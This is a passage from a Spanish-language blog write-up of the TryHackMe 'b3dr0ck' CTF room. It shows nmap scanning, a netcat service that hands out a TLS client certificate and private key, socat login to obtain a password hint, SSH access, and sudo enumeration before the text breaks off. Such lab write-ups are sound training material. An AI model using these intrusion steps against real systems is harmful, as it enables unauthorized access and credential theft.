<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Try Hack Me - b3dr0ck - Writeup" /><meta property="og:locale" content="es_ES" /><meta name="description" content="En esta guía vamos a trabajar con la máquina b3dr0ck disponible en THM, un sencillo CTF creado por F11snipe en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utilización de algunas herramientas online para codificación y crakeo, entre otras curiosidades." /><meta property="og:description" content="En esta guía vamos a trabajar con la máquina b3dr0ck disponible en THM, un sencillo CTF creado por F11snipe en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utilización de algunas herramientas online para codificación y crakeo, entre otras curiosidades." /><link rel="canonical" href="https://ewan67.github.io/posts/thm-writeup-b3dr0ck/" /><meta property="og:url" content="https://ewan67.github.io/posts/thm-writeup-b3dr0ck/" /><meta property="og:site_name" content="ewan67" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-08T02:30:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Try Hack Me - b3dr0ck - Writeup" /><meta name="twitter:site" content="@ewan674" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-08T02:30:00+01:00","datePublished":"2022-09-08T02:30:00+01:00","description":"En esta guía vamos a trabajar con la máquina b3dr0ck disponible en THM, un sencillo CTF creado por F11snipe en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utilización de algunas herramientas online para codificación y crakeo, entre otras curiosidades.","headline":"Try Hack Me - b3dr0ck - Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://ewan67.github.io/posts/thm-writeup-b3dr0ck/"},"url":"https://ewan67.github.io/posts/thm-writeup-b3dr0ck/"}</script><title>Try Hack Me - b3dr0ck - Writeup | ewan67</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ewan67"><meta name="application-name" content="ewan67"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/ewan67-avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ewan67</a></div><div class="site-subtitle font-italic">La verdadera ignorancia no es la ausencia de conocimiento, sino la negativa a adquirirlo.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ewan67" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ewan674" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ewan67','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Try Hack Me - b3dr0ck - Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Try Hack Me - b3dr0ck - Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1662600600" data-df="YYYY-MM-DD" data-toggle="tooltip" data-placement="bottom"> 2022-09-08 </em> </span><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://twitter.com/ewan674">ewan67</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2565 palabras"> <em>14 min</em> de lectura</span></div></div></div><div class="post-content"><p>En esta guía vamos a trabajar con la máquina <a href="https://tryhackme.com/room/b3dr0ck">b3dr0ck</a> disponible en <a href="https://tryhackme.com">THM</a>, un sencillo CTF creado por <a href="https://tryhackme.com/p/F11snipe">F11snipe</a> en el que pondremos en práctica técnicas de enumeración, escalado de privilegios y utilización de algunas herramientas online para codificación y crakeo, entre otras curiosidades.</p><p>Dentro música.</p><h2 id="inicio"><span class="mr-2">Inicio</span><a href="#inicio" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Para empezar, echamos un ojo a la descripción que aparece en el room:</p><p><img data-src="/assets/posts/20220908/img_00.jpg" alt="" data-proofer-ignore></p><p>Fred Flintstone &amp; Barney Rubble!</p><p>Barney está configurando el servidor web ABC tratando de utilizar los certificados TLS para asegurar las conexiones, pero está teniendo problemas. Esto es lo que sabemos…</p><ul><li>Fue capaz de configurar <strong>nginx</strong> en el puerto <strong>80</strong>, redirigiendo a un servidor web TLS personalizado en el puerto <strong>4040</strong>.<li>Hay un socket TCP escuchando con un servicio que permite recuperar los archivos de credenciales TLS (clave y certificado del cliente).<li>Hay otro servicio TCP (TLS) escuchando para las conexiones autorizadas utilizando los archivos obtenidos del servicio anterior.</ul><p>OK, nos dicen que tenemos un servidor escuchando en el <em>tcp/80</em> que redirige al <em>tcp/4040</em> y dos servicios en puertos a descubrir.</p><p>En términos de usuarios, podemos sospechar que estan <em>Fred</em> y <em>Barney</em>.</p><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Arrancamos con <strong>nmap</strong> a ver qué encontramos.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> 10.10.40.42 <span class="nt">-oN</span> nmap_output
<span class="go">Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 16:42 CEST
Nmap scan report for 10.10.40.42
Host is up (0.036s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
</span><span class="gp">22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.40.42:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Thu, 08 Sep 2022 14:46:31 GMT
|     Connection: close
</span><span class="gp">|     &lt;!DOCTYPE html&gt;</span><span class="w">
</span><span class="gp">|     &lt;html&gt;</span><span class="w">
</span><span class="gp">|     &lt;head&gt;</span><span class="w">
</span><span class="gp">|     &lt;title&gt;</span>ABC&lt;/title&gt;
<span class="gp">|     &lt;style&gt;</span><span class="w">
</span><span class="go">|     body {
</span><span class="gp">|     width: 35em;</span><span class="w">
</span><span class="gp">|     margin: 0 auto;</span><span class="w">
</span><span class="gp">|     font-family: Tahoma, Verdana, Arial, sans-serif;</span><span class="w">
</span><span class="gp">|     &lt;/style&gt;</span><span class="w">
</span><span class="gp">|     &lt;/head&gt;</span><span class="w">
</span><span class="gp">|     &lt;body&gt;</span><span class="w">
</span><span class="gp">|     &lt;h1&gt;</span>Welcome to ABC!&lt;/h1&gt;
<span class="gp">|     &lt;p&gt;</span>Abbadabba Broadcasting Compandy&lt;/p&gt;
<span class="go">[...]
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-09-08T14:40:55
|_Not valid after:  2023-09-08T14:40:55
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ &lt;| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2022-09-08T14:40:55
|_Not valid after:  2023-09-08T14:40:55
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=9/8%Time=631A0048%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nDate:\x20Thu,\x2008\x20Sep\x202022\x2014:46:31\x20GMT\r\nConnection
</span><span class="gp">SF::\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;</span><span class="se">\n</span>&lt;html&gt;<span class="se">\n\x</span>20<span class="se">\x</span>20&lt;<span class="nb">head</span><span class="o">&gt;</span><span class="se">\n\x</span>20<span class="se">\x</span>20<span class="se">\</span>
<span class="go">[...]
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 383.97 seconds
</span></pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-sC</code> : devuelve información sobre la versión de los servicios corriendo en los puertos abiertos.<li><code class="language-plaintext highlighter-rouge">-sV</code> : realiza un escaneo utilizando el conjunto de scripts por defecto de <strong>nmap</strong>.<li><code class="language-plaintext highlighter-rouge">-p-</code> : escanea los 65535 puertos.<li><code class="language-plaintext highlighter-rouge">-oN</code> : imprime la salida en un fichero de texto con el nombre <em>nmap_output</em></ul><p>El volcado de <strong>nmap</strong> nos cuenta que tenemos cinco puertos abiertos:</p><ul><li><em>22/tcp</em> con un servicio <strong>ssh</strong> escuchando<li><em>80/tcp</em> con un <strong>nginx 1.18.0</strong> escuchando<li><em>4040/tcp</em> el puerto al que redirige el anterior, con un servicio SSL escuchando<li><em>9009/tcp</em> con un servicio <strong>pichat</strong> corriendo (?)<li><em>54321/tcp</em> con otro servicio SSL escuchando</ul><p>Cargamos la IP del room en el browser <code class="language-plaintext highlighter-rouge">http://10.10.40.42</code>. Nos redirige a <code class="language-plaintext highlighter-rouge">https://10.10.40.42:4040</code> y nos da un Warning por el certificado. Aceptamos los riesgos.</p><p><img data-src="/assets/posts/20220908/img_01.png" alt="" data-proofer-ignore></p><p>Nos carga un vista con el siguiente texto.</p><p><img data-src="/assets/posts/20220908/img_02.png" alt="" data-proofer-ignore></p><p>Todo muy bonito pero muy poco con lo que poder avanzar más allá de cierta confirmación sobre la existencia del usuario <em>Barney</em>.</p><p>Retomando lo que nos indicaban en la descripción del room sabemos que hay un socket TCP escuchando con un servicio que nos ayudará a recuperar los archivos de credenciales TLS/SSL.</p><blockquote><p><strong>Qué es un Socket y para qué sirve:</strong> Cuando dos procesos que están en hosts diferentes (ordenadores, smartphones o cualquier dispositivo conectado a una red) quieren intercambiar información a través de dicha red (sea ésta local o Internet) es necesario que abran un <strong>socket</strong> (TCP o UDP) para establecer la comunicación e intercambiar datos. Todas las comunicaciones entre dos o más hosts se realizan a nivel de la <strong>Capa de Transporte</strong> (capa 4 del modelo OSI / capa 3 en el modelo TCP/IP), que es la primera capa donde hay una comunicación punto a punto entre dos o más equipos.</p></blockquote><p>A partir el volcado de <strong>nmap</strong> los candidatos son el <em>9009/tcp</em> y el <em>54321/tcp</em>.</p><p>Probamos con el <em>9009/tcp</em>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
</span><span class="gp">└─$</span><span class="w"> </span>nc 10.10.40.42 9009
<span class="go">

 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ &lt;| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
</span><span class="gp">socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;</span>,key<span class="o">=</span>&lt;KEY_FILE&gt;,verify<span class="o">=</span>0
<span class="go">What are you looking for?
</span></pre></table></code></div></div><p>Bien. En el puerto <em>9009/tcp</em> efectivamente esta corriendo el servicio que permite recuperar los archivos de credenciales TLS (clave y certificado del cliente); y en el <em>54321/tcp</em> nos confirman que esta activo el <em>secure login service</em>, el servicio que soporta las conexiones autorizadas utilizando los archivos obtenidos mediante éste. También nos indican cómo debemos conectarnos al servicio de login utilizando <strong>socat</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0
</pre></table></code></div></div><p>Probamos a obtener los archivos de credenciales.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="go">What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA5MDgxNDQxMDhaFw0yMzA5MDgxNDQxMDhaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDxK/4/
[...]
+IDCFi9RDrG016HRQ19mqIzdgz4yfggneQpgIN424r4+ZAziusSzPTRUXlfTUjDM
M8uAgM7JYLBE75+uCnIu3n1cbcziBa4R8X4ax+cQdRmCyArsveH43KSplVUUF+Uw
Z9wlbTI=
-----END CERTIFICATE-----

What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA8Sv+P0pngoe7EWgnmV3P2hoym3sN9Tc7KSXKreOnVz6MHavo
b/hzS7lNwc6D+q/rR0KUVSiW5Y5luGUCIf3C54AnbeaI1auajXGVkXuVyaAUTaeQ
57lHDcv9bH7Ss8dL+HhCRB1tBNxGxhD+rX1goHne18vgByTAEw9LgJO0ZVtdbdHR
[...]
Vo1xDhcCgYEAyrmN49C6gn5Rx7E6RHV+D4dio/xdmt4zYK3M6SUMIMqO7DdOkcsh
ebD1SOBGilbjDmKdv8jKu/vAvLYEIs7zXsIFH/d6xqvpJFEqAVrByuXsF69ts9fl
2q4we74ej2L8zl/LHkVj7xhnxfjYQ81swNPq6KfXUMxfSjHh1U3nQ6U=
-----END RSA PRIVATE KEY-----

What are you looking for?
</span></pre></table></code></div></div><p>Copiamos el Certificado TLS y la Clave Privada en sendos ficheros con el nombre <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">cert.pem</code>   y <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">key.pem</code> respectivamente. Una vez tenemos ambos ficheros creados en nuestro directorio de trabajo, y tal como nos sugieren, utilizamos <strong>socat</strong> para conectarnos al servicio de login disponible en el puerto <em>54321/tcp</em>.</p><blockquote><p><strong>Socat</strong> es una utilidad de red basada en línea de comandos que posibilita la transferencia bidireccional de datos entre dos canales de datos independientes. Se la considera la versión avanzada de <strong>netcat</strong> pues si bien hacen cosas similares, <strong>socat</strong> cuenta con varias funciones adicionales.</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
</span><span class="gp">└─$</span><span class="w"> </span>socat stdio ssl:10.10.40.42:54321,cert<span class="o">=</span>cert.pem,key<span class="o">=</span>key.pem,verify<span class="o">=</span>0
<span class="go">

 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'Barney Rubble' is authorized.
</span><span class="gp">b3dr0ck&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">Unrecognized command: 'ls'

This service is for login and password hints
</span><span class="gp">b3dr0ck&gt;</span><span class="w"> </span><span class="nb">help</span>
<span class="go">Password hint: d1ad7c0[...]4180dd (user = 'Barney Rubble')
</span><span class="gp">b3dr0ck&gt;</span><span class="w">
</span></pre></table></code></div></div><p>OK, tenemos la contraseña del usuario <em>barney</em>. Tiramos del <strong>ssh</strong> que tenemos disponible en el puerto <em>22/tcp</em> para conectarnos.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/b3dr0ck]
</span><span class="gp">└─$</span><span class="w"> </span>ssh barney@10.10.40.42
<span class="go">The authenticity of host '10.10.40.42 (10.10.40.42)' can't be established.
ED25519 key fingerprint is SHA256:CFTFQcdE19Y7z0z2H7f+gsTTUaLOiPE1gtFt0egy/V8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.40.42' (ED25519) to the list of known hosts.
barney@10.10.40.42's password:
</span><span class="gp">barney@b3dr0ck:~$</span><span class="w"> </span><span class="nb">pwd</span>
<span class="go">/home/barney
</span><span class="gp">barney@b3dr0ck:~$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">barney.txt
</span><span class="gp">barney@b3dr0ck:~$</span><span class="w"> </span><span class="nb">cat </span>barney.txt
<span class="go">THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
</span><span class="gp">barney@b3dr0ck:~$</span><span class="w">
</span></pre></table></code></div></div><p>Tenemos la primer flag correspondiente al usuario <em>barney</em>. Seguimos.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">barney@b3dr0ck:~$</span><span class="w"> </span><span class="nb">cd</span> ..
<span class="gp">barney@b3dr0ck:/home$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">barney  fred
</span><span class="gp">barney@b3dr0ck:/home$</span><span class="w"> </span><span class="nb">cd </span>fred
<span class="gp">barney@b3dr0ck:/home/fred$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">fred.txt
</span><span class="gp">barney@b3dr0ck:/home/fred$</span><span class="w"> </span><span class="nb">cat </span>fred.txt
<span class="go">cat: fred.txt: Permission denied
</span><span class="gp">barney@b3dr0ck:/home/fred$</span><span class="w">
</span></pre></table></code></div></div><p>Necesitamos hacer un escalado de privilegios horizonal.</p><h2 id="escalado-de-privilegios-horizonal"><span class="mr-2">Escalado de privilegios horizonal</span><a href="#escalado-de-privilegios-horizonal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Veamos qué binarios puede ejecutar <em>barney</em> con privilegios de root.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">barney@b3dr0ck:/home/fred$</span><span class="w"> </span><span class="nb">cd</span> ..
<span class="gp">barney@b3dr0ck:/home$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
</span><span class="gp">barney@b3dr0ck:/home$</span><span class="w">
</span></pre></table></code></div></div><p>Tenemos disponible el binario <strong>certutil</strong>.</p><blockquote><p><strong>certutil</strong> es una utilidad de línea de comandos que puede crear y modificar bases de datos de certificados y claves. En concreto, puede enumerar, generar, modificar o eliminar certificados, crear o cambiar la contraseña, generar nuevos pares de claves públicas y privadas, mostrar el contenido de la base de datos de claves o eliminar pares de claves dentro de la base de datos de claves. <a href="https://www.systutorials.com/docs/linux/man/1-certutil/">fuente</a></p></blockquote><p>Estupendo. Vamos con ello.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter 